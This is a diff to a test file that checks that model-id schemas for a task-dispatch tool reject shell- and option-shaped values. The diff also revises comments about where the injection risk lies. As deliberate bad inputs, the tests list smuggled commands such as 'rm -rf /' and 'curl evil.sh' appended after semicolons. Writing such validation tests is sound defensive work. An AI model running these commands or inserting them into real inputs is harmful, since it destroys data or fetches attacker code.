@@ -8,9 +8,9 @@ import { join } from "node:path";
 //
 // Three things are at stake, and all three are quiet failures rather than loud ones:
 // a per-agent default that another agent's edit silently wipes; a "default" frozen at
-// the moment a task was shelved rather than read when it launches; and a model id that
-// reaches a tmux command line - which tmux joins with spaces and runs through a SHELL -
-// carrying something the shell would rather interpret than pass along.
+// the moment a task was shelved rather than read when it launches; and a model id whose
+// parser-reserved shape is stored successfully but is later mistaken for an option or path
+// when the harness launches.
 
 const home = mkdtempSync(join(tmpdir(), "mission-dispatch-model-"));
 // Set before importing anything that resolves the state dir.
@@ -129,12 +129,12 @@ test("a backlogged task launches on the default in force NOW, not when it was sh
   assert.equal(resolveDispatchModel("claude", shelved), "claude-fable-5");
 });
 
-// ---- the id that reaches a shell ----
+// ---- the id that reaches a harness option parser ----
 
 test("a model id carrying shell syntax is refused before it can be stored", () => {
-  // `spawnDetachedSession` appends this to a `tmux new-session` command line, and tmux
-  // joins its trailing arguments and runs them through a shell. Every one of these
-  // would be INTERPRETED there, so the schema is the place it has to stop.
+  // Terminal adapters preserve argv boundaries, but model ids remain persisted input to
+  // harness option parsers. The schema owns that narrow vocabulary and rejects option-,
+  // path-, whitespace-, and control-shaped values before they can be stored.
   for (const bad of [
     "claude-opus-4-8; rm -rf /",
     "claude-opus-4-8 && curl evil.sh",
@@ -191,7 +191,7 @@ test("a dispatch without a model is valid and stays absent, meaning 'use the def
 });
 
 test("a config patch is held to the same id rule as a dispatch", () => {
-  // The settings route is a second door onto the same command line.
+  // The settings route is a second door into the same persisted launch argument.
   assert.equal(
     HarnessesConfigPatchSchema.safeParse({ defaultModel: { claude: "a; rm -rf /" } }).success,
     false,
@@ -201,7 +201,7 @@ test("a config patch is held to the same id rule as a dispatch", () => {
 test("editing a backlog task is the third door, and no wider than the other two", () => {
   // The dispatch modal reopened on a shelved card writes through /update, so a model id
   // can reach a stored row without ever passing DispatchSchema. Null is the one extra
-  // value it takes, and that one never reaches a command line - it removes the flag.
+  // value it takes, and that one never reaches a harness parser - it removes the flag.
   assert.equal(UpdateTaskSchema.safeParse({ model: "x; id" }).success, false);
   assert.equal(UpdateTaskSchema.safeParse({ model: "claude-opus-4-8" }).success, true);
   assert.equal(UpdateTaskSchema.parse({ model: null }).model, null);
